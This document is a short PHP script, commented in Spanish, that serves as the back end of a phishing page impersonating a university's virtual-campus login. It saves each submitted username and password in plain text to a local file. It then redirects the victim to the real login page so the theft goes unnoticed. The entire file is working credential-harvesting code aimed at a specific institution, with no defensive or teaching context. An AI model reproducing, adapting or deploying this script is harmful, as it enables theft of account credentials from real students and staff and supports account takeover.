<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    //  datos del formulario
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Almacenar datos en un archivo de texto (o en una base de datos)
    $file = fopen("credenciales.txt", "a");
    fwrite($file, "Username: " . $username . " Password: " . $password . "\n");
    fclose($file);

    // Redirigir al usuario a la página de inicio de 
    header("Location: https://univirtual.uni.pe/login/index.php");
    exit();
}
?>

